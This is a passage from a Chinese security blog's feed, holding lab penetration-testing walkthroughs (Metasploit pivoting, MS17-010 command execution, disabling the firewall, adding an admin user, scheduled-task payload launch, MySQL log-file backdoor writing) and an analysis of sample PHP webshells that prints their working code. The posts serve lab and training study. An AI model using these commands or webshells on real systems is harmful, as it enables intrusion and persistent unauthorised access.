src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309174904839.png" alt="image-20200309174904839" title>                </div>                <div class="image-caption">image-20200309174904839</div>            </figure><p>权限已经是system，直接获取账号密码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309175103168.png" alt="image-20200309175103168" title>                </div>                <div class="image-caption">image-20200309175103168</div>            </figure><p>查看域环境</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309175520773.png" alt="image-20200309175520773" title>                </div>                <div class="image-caption">image-20200309175520773</div>            </figure><p>获取到内网ip段 192.168.140.*</p><p>开启3389</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309175138132.png" alt="image-20200309175138132" title>                </div>                <div class="image-caption">image-20200309175138132</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309175301509.png" alt="image-20200309175301509" title>                </div>                <div class="image-caption">image-20200309175301509</div>            </figure><p>利用rdestop进行远程登陆，因为这里win7系统是开着的，没办法登进去（以前不是可以直接挤下去嘛？？）</p><p>获取到内网ip段后添加路由</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309180147083.png" alt="image-20200309180147083" title>                </div>                <div class="image-caption">image-20200309180147083</div>            </figure><p>但这样只能在msf里对内网环境进行测试，所以设置代理，让其他工具也可以访问到内网</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks4a</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309180522910.png" alt="image-20200309180522910" title>                </div>                <div class="image-caption">image-20200309180522910</div>            </figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line">打开之后在下面加入</span><br><span class="line">socks4 127.0.0.1 yourPort</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309180802697.png" alt="image-20200309180802697" title>                </div>                <div class="image-caption">image-20200309180802697</div>            </figure><p>接下来就可以用nmap来扫描内网环境了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">proxychains nmap -T4 -vv -Pn -sT <span class="number">192.168</span><span class="number">.140</span><span class="number">.139</span></span><br><span class="line"><span class="comment">//-Pn -sT 是必须加的</span></span><br><span class="line"><span class="comment">//不用nmap的话msf里面的扫描模块也是可以的，上篇文章有讲到</span></span><br></pre></td></tr></table></figure><p>效果图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309181128345.png" alt="image-20200309181128345" title>                </div>                <div class="image-caption">image-20200309181128345</div>            </figure><p>开了445端口，存在ms17010但是无法回弹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不回弹但可以直接执行命令</span></span><br><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309181653361.png" alt="image-20200309181653361"></p><p>为了后续操作，这里把防火墙关掉</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//关防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line">//添加用户</span><br><span class="line">net user admin password /add</span><br><span class="line">net localgroup administrators admin /add</span><br></pre></td></tr></table></figure><p>返回之前的session</p><p>因为知道了目标机器的账号密码，可以利用445端口对远程磁盘进行挂载，方便木马传输</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.140.139\ipc$ password /user:username </span><br><span class="line">远程磁盘进行挂载</span><br><span class="line">net use k: \\192.168.140.139\c$</span><br><span class="line">查看目标机器时间 方便执行任务计划</span><br><span class="line">net time \\ip</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309184326525.png" alt="image-20200309184326525" title>                </div>                <div class="image-caption">image-20200309184326525</div>            </figure> <p>利用任务计划执行我们上传的马子</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.140.139 19:40 c:\\shell.exe</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309193416123.png" alt="image-20200309193416123" title>                </div>                <div class="image-caption">image-20200309193416123</div>            </figure><p>获取本地密码、开启3389</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309193528315.png" alt="image-20200309193528315" title>                </div>                <div class="image-caption">image-20200309193528315</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/09/%E3%80%90%E7%BA%A2%E6%97%A5sec%E3%80%91%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20200309193726821.png" alt="image-20200309193726821" title>                </div>                <div class="image-caption">image-20200309193726821</div>            </figure><p>就到这里，没什么技术含量，大牛勿喷（表哥求带）</p><h3 id="本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。"><a href="#本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。" class="headerlink" title="本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。"></a>本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;靶场下载地址：http-vulnstack-qiyuanxuetang-net-vuln-detail-2&quot;&gt;&lt;a href=&quot;#靶场下载地址：http-vulnstack-qiyuanxuetang-net-vuln-detail-2&quot; class=&quot;heade
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://13l00m.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网" scheme="https://13l00m.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="渗透" scheme="https://13l00m.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="MSF" scheme="https://13l00m.github.io/tags/MSF/"/>
    
  </entry>
  
  <entry>
    <title>【靶机】记一次简单的内网渗透测试</title>
    <link href="https://13l00m.github.io/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>https://13l00m.github.io/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2020-03-07T12:53:02.000Z</published>
    <updated>2020-03-07T13:23:53.102Z</updated>
    
    <content type="html"><![CDATA[<h3 id="开始之前先说一下实验环境："><a href="#开始之前先说一下实验环境：" class="headerlink" title="开始之前先说一下实验环境："></a>开始之前先说一下实验环境：</h3><ul><li>两台物理机（物理机里面存有虚拟机）</li><li>win10 存在kali 虚拟机 ip都在192.168.1.* 网段</li><li>2k3 存在2k3 虚拟机 物理机在192.168.1.* 网段 虚拟机在192.168.159.*网段（提供内网环境）</li><li>两台物理机可互相ping通，kali虚拟机也可以ping通2k3物理机，2k3虚拟机只能由2k3物理机ping通（这么说可以理解吧）</li><li>漏洞环境就简单处理了，主要是想记录一下如何利用2k3外网服务器做跳板间接连通内网服务器继续进行测试</li><li>2k3物理机ip：192.168.1.2</li><li>2k3虚拟机ip：192.168.159.139</li><li>win10物理机ip：192.168.1.3</li><li>kali虚拟机ip：192.168.1.123</li></ul><h2 id="开始实验："><a href="#开始实验：" class="headerlink" title="开始实验："></a>开始实验：</h2><hr><p>访问 192.168.1.2</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>进行目录扫描：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>每个目录访问一遍</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>这靶场大家应该都玩过了，上传个小马（就当上传漏洞了），目录里面还有一个phpmyadmin 这个一会儿进行作跳板的时候会用到。避免重复呢，我就直接上传个小马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>利用msf生成木马（用msf回弹主要是需要添加路由）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>在msf模块监听设置好的端口</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>用之前传的小马+蚁剑虚拟终端打开上传的shell123.exe</p><p>msf 可以检测到回传</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>利用内置模块检测可以连通的内网网段</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>已知内网机器是在192.168.159.0/24段的，我就不卖关子直接添加路由了（route add 也是可以的）</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>查看添加路由情况</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>接下来利用msf 进行内网网段中存活主机的扫描</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>已知内网ip在139 我就缩小一下范围，节约时间</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/13.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>成功检测到139开放80端口</p><p>但这个时候直接访问是不可行的，接下来进行端口映射</p><p>回到刚才的Session</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/14.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>利用 portfwd 进行端口映射<br>将内网中的80端口映射到kali机中的80端口<br>访问<a href="http://localhost" target="_blank" rel="noopener">http://localhost</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/15.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>访问成功<br>为了方便拿shell，这里就用phpmyadmin弱口令直接进去了</p><p>根据phpinfo文件提供的绝对路径，修改sql的日志存储绝对路径就可以构造后门php文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/17.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &apos;%general%&apos;; #查看配置</span><br><span class="line">set global general\_log = on; #开启general log 模式</span><br><span class="line">set global general_log_file = &apos;D:\phpstudy\PHPTutorial\WWW&apos;; #设置日志目录为shell地址</span><br><span class="line">select &quot;payload&quot; 写入shell</span><br></pre></td></tr></table></figure><p>这里可能是我的配置问题，小马回传到msf的时候会收到但是直接断掉，所以直接上传了个大马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/18.png" alt="file" title>                </div>                <div class="image-caption">file</div>            </figure><p>上传dama.exe可以正常收到回弹信息</p><h3 id="本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。"><a href="#本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。" class="headerlink" title="本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。"></a>本人撰写的文章，仅供学习和研究使用，请勿使用文中的技术用于非法用途，任何人造成的任何负面影响，与本人无关。</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;开始之前先说一下实验环境：&quot;&gt;&lt;a href=&quot;#开始之前先说一下实验环境：&quot; class=&quot;headerlink&quot; title=&quot;开始之前先说一下实验环境：&quot;&gt;&lt;/a&gt;开始之前先说一下实验环境：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;两台物理机（物理机里面存有虚拟机）&lt;/l
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://13l00m.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="内网" scheme="https://13l00m.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="渗透" scheme="https://13l00m.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="MSF" scheme="https://13l00m.github.io/tags/MSF/"/>
    
  </entry>
  
  <entry>
    <title>PHP恶意代码分析</title>
    <link href="https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2019-11-28T01:58:50.000Z</published>
    <updated>2019-11-28T04:15:08.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="墨者学院–WebShell代码分析溯源-第11题"><a href="#墨者学院–WebShell代码分析溯源-第11题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第11题)"></a>墨者学院–WebShell代码分析溯源(第11题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="number">1</span>]) &amp;&amp; $_GET[<span class="number">1</span>]==<span class="string">'GET.fPZ87'</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> $_=@fopen(<span class="string">'t.php'</span>, <span class="string">'a'</span>);</span><br><span class="line"></span><br><span class="line"> @fwrite($_,<span class="string">"&lt;?php \$_=str_replace('ilo','ass',str_replace('vey','ert',\$_GET[2]));@\$_(\$_POST[1]);?&gt;"</span>);</span><br><span class="line"> </span><br><span class="line"> @fclose($_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5">程序分析</font></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="number">1</span>]) &amp;&amp; $_GET[<span class="number">1</span>]==<span class="string">'GET.fPZ87'</span>)</span><br><span class="line">    <span class="comment">//判断通过GET方式参数1是否为空 且 参数值是否为 GET.fPZ87</span></span><br><span class="line">    $_= @fopen(<span class="string">'t.php'</span>,<span class="string">'a'</span>);<span class="comment">// 打开一个新文件 t.php ,模式 a 为写入内容不覆盖</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分析构造的一句话</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">       </span><br><span class="line">       \$_=str_replace(<span class="string">'ilo'</span>,<span class="string">'ass'</span>,str_replace(<span class="string">'vey'</span>,<span class="string">'ert'</span>,\$_GET[<span class="number">2</span>]));</span><br><span class="line"></span><br><span class="line">   @\$_(\$_POST[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">   <span class="meta">?&gt;</span></span><br><span class="line">      变量 $_ 由 $_GET[<span class="number">2</span>] 通过GET方式传入数据，再由嵌套替换决定最后的内容</span><br><span class="line">       \$_ 与 \$_GET[<span class="number">2</span>] 前面的 \ 是转义用的</span><br><span class="line">       str_replace(待匹配字符,待替换字符,待匹配字符串)</span><br><span class="line">       </span><br><span class="line">       所以呢，最后拼接的一句话为：</span><br><span class="line">       assert($_POST[<span class="number">1</span>])</span><br><span class="line">       <span class="comment">//当然 要完成这种拼接，$_GET[2]需要传入的值为：ilovey</span></span><br><span class="line">           $_POST[<span class="number">1</span>]需要传入的值为：需要执行的php代码</span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5">实战</font></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第11题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第11题)/2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第11题)/3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="墨者学院–WebShell代码分析溯源-第10题"><a href="#墨者学院–WebShell代码分析溯源-第10题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第10题)"></a>墨者学院–WebShell代码分析溯源(第10题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">'GET'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5">程序分析</font></p><h3 id="php-declare-ticks-N"><a href="#php-declare-ticks-N" class="headerlink" title="php declare (ticks = N)"></a><a href="https://www.cnblogs.com/debmzhang/p/4234328.html" target="_blank" rel="noopener">php declare (ticks = N)</a></h3><h3 id="关于什么是低级语句"><a href="#关于什么是低级语句" class="headerlink" title="关于什么是低级语句"></a><a href="http://my.oschina.net/Jacker/blog/32936" target="_blank" rel="noopener"><strong>关于什么是低级语句</strong></a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//尽管程序出错也不会报错</span></span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];  <span class="comment">// 接收参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>); </span><br><span class="line"><span class="comment">//php官方文档对ticks的定义 ：</span></span><br><span class="line"><span class="comment">//A tick is an event that occurs for every N low-level tickable statements executed by the parser within the declare block. The value for N is specified using ticks=N within the declare block's directive section.||</span></span><br><span class="line">Tick（时钟周期）是一个在 <span class="keyword">declare</span> 代码段中解释器每执行 N 条可计时的低级语句就会发生的事件。N 的值是在 <span class="keyword">declare</span> 中的 directive 部分用ticks=N 来指定的. </span><br><span class="line"></span><br><span class="line">我个人理解的大意就是说, tick 这个周期上会绑定一个事件, 这个事件, 当Zend引擎执行到所设置的 tick (就是N) 行低级语句时, 就执行  register_tick_function()  定义的事件 </span><br><span class="line"> </span><br><span class="line">因为这里只涉及到如何利用register_tick_function()函数进行构造代码执行，暂不深究</span><br><span class="line">  </span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">'GET'</span>]);</span><br><span class="line"></span><br><span class="line">register_tick_function(函数名,给函数传入的值)</span><br><span class="line">如果要构造远程代码执行的话：register_tick_function(<span class="string">'assert'</span>,<span class="string">'command'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5">实战</font></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/恶意代码分析/墨者学院--WebShell代码分析溯源(第10题)/1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="墨者学院–WebShell代码分析溯源-第9题"><a href="#墨者学院–WebShell代码分析溯源-第9题" class="headerlink" title="墨者学院–WebShell代码分析溯源(第9题)"></a>墨者学院–WebShell代码分析溯源(第9题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"></span><br><span class="line">register_shutdown_function($e, $_REQUEST[<span class="string">'REQUEST'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5">程序分析</font></p><h3 id="register-shutdown-function"><a href="#register-shutdown-function" class="headerlink" title="register_shutdown_function()"></a><a href="https://blog.csdn.net/tdcqfyl/article/details/52291237" target="_blank" rel="noopener">register_shutdown_function()</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//不报错</span></span><br><span class="line"></span><br><span class="line">$e = 